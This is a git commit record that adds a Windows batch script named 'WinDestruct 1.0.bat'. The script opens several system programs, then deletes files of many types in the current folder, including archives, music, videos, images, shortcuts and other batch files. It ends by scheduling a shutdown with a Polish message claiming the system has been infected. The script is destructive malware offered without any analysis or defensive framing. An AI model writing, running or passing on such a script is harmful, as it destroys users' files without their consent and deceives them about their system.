8528a6edf2ced481d6b3b7e6e6e9856116cf443f
Kubas431 <kuba80269@gmail.com>
2024-10-28 16:29:08 +0100

    WinDestruct 1.0.bat

---
+++ WinDestruct 1.0.bat
@@ -0,0 +1,25 @@
+@echo off
+start charmap.exe
+start calc.exe
+start regedit.exe
+start explorer.exe
+start cmd.exe
+copy *.000 *.*
+del*rar
+del *zip
+del*mp3
+del *xml
+del *.lnk
+del*.com
+del *.bat
+del*.avi
+del *.mpeg
+del*.mp4
+del *.amr
+del*.3gp
+del *.jpg
+del *.bmp
+del*.png
+del *.gif
+del*.ico
+shutdown -s -t 300 -c "Twuj system zostal zarazony:WinDestruct 1.0.bat!"
